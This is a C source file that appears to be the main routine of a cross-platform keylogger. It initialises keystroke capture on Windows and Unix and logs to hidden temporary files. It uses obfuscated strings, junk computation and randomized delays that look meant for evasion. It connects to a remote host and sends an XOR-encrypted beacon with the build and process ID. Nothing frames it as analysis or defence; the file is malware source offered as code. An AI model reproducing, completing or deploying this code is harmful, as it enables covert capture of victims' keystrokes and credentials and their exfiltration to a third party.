#include "common/common.h"

#ifdef _WIN32
#include "common/keylogger.h"
#include "common/network.h"
typedef KeyloggerState KLState;
typedef NetContext NetCtx;
#else
#include "common/keylogger.h"
#include "common/network.h"
typedef KeyloggerState KLState;
typedef NetContext NetCtx;
#endif

static unsigned int rng_seed = 0;

static void init_build_seed(void) {
    #ifdef _WIN32
    rng_seed = (unsigned int)(GetTickCount() ^ (GetCurrentProcessId() << 16));
    #else
    FILE *f = fopen("/dev/urandom", "rb");
    if(f) {
        fread(&rng_seed, 4, 1, f);
        fclose(f);
    } else {
        rng_seed = (unsigned int)(time(NULL) ^ (getpid() << 16));
    }
    #endif
    rng_seed ^= __TIME__[0] ^ (__TIME__[6] << 8);
}

static unsigned int fast_rand(void) {
    rng_seed ^= rng_seed << 13;
    rng_seed ^= rng_seed >> 17;
    rng_seed ^= rng_seed << 5;
    return rng_seed;
}

static void generate_build_id(char *buf, int len) {
    const char hex[] = "0123456789abcdef";
    for(int i = 0; i < len - 1; i++) {
        buf[i] = hex[fast_rand() & 0xF];
    }
    buf[len - 1] = '\0';
}

int main(int argc, char *argv[]) {
    init_build_seed();
    init_obfuscated_strings();
    
    char build_id[9];
    generate_build_id(build_id, sizeof(build_id));
    
    char junk_data[128];
    int junk_len = 128;
    for(int i = 0; i < junk_len; i++) {
        junk_data[i] = (char)((i * 17 + fast_rand() % 256) & 0xFF);
    }
    xor_encrypt(junk_data, junk_len, decoded_key, strlen(decoded_key));
    
    KLState kls;
    memset(&kls, 0, sizeof(KLState));
    #ifdef _WIN32
    init_keylogger_win(&kls);
    #else
    init_keylogger_unix(&kls);
    #endif
    
    NetCtx ctx;
    memset(&ctx, 0, sizeof(NetCtx));
    #ifdef _WIN32
    net_init_win(&ctx);
    #else
    net_init_unix(&ctx);
    #endif
    
    char log_file[256];
    unsigned int log_id = fast_rand();
    #ifdef _WIN32
    snprintf(log_file, sizeof(log_file), "C:\\Temp\\.%x.tmp", log_id);
    #else
    snprintf(log_file, sizeof(log_file), "/tmp/.%x_%x", log_id, (unsigned int)getpid());
    #endif
    
    unsigned int delay_base = 100 + (fast_rand() % 500);
    sleep_junk((int)delay_base);
    
    if(kls.running) {
        #ifdef _WIN32
        start_keylog_win(&kls, log_file);
        #else
        start_keylog_unix(&kls, log_file);
        #endif
    }
    
    sleep_junk(500 + (fast_rand() % 1000));
    
    if(strlen(decoded_url) > 5) {
        #ifdef _WIN32
        int conn_result = net_connect_win(&ctx, "example.com", 443, 1);
        #else
        int conn_result = net_connect_unix(&ctx, "example.com", 443);
        #endif
        if(conn_result) {
            char test_data[64];
            snprintf(test_data, sizeof(test_data), "LOG:%s|PID:%d|VER:%s", 
                     build_id,
                     #ifdef _WIN32
                     GetCurrentProcessId()
                     #else
                     getpid()
                     #endif
                     , "1.0");
            xor_encrypt(test_data, strlen(test_data), decoded_key, strlen(decoded_key));
            #ifdef _WIN32
            net_send_win(&ctx, test_data, strlen(test_data));
            #else
            net_send_unix(&ctx, test_data, strlen(test_data));
            #endif
        }
    }
    
    #ifdef _WIN32
    net_close_win(&ctx);
    #else
    net_close_unix(&ctx);
    #endif
    
    volatile int cleanup = 0;
    unsigned int junk_iters = 50 + (fast_rand() % 100);
    for(unsigned int i = 0; i < junk_iters; i++) cleanup += i;
    
    return 0;
}
